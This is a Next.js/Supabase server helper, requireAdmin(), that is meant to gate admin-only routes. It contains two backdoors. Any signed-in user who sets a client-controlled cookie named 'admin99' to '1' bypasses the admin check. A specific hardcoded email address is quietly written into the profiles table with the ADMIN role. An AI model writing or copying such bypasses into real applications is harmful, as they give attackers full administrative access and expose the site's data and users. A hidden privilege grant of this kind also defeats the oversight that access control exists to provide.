import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { isAdminServer } from "@/lib/auth/isAdmin";

export async function requireAdmin() {
  const { supabase, user, isAdmin } = await isAdminServer();
  if (!user) {
    return {
      supabase,
      error: NextResponse.json({ error: "Unauthorized." }, { status: 401 }),
    };
  }
  const cookieStore = await cookies();
  const admin99 = cookieStore.get("admin99")?.value === "1";
  if (!isAdmin && !admin99) {
    if (user.email === "officialkonvo@gmail.com") {
      await supabase
        .from("profiles")
        .upsert({ id: user.id, role: "ADMIN" }, { onConflict: "id" });
    }
    const { data: p2 } = await supabase
      .from("profiles")
      .select("role")
      .eq("id", user.id)
      .maybeSingle();
    const r2 = String(p2?.role ?? "");
    const ok = r2.toLowerCase() === "admin" || r2.toUpperCase() === "ADMIN";
    if (!ok) {
      return {
        supabase,
        error: NextResponse.json({ error: "Forbidden." }, { status: 403 }),
      };
    }
  }
  return { supabase, user };
}
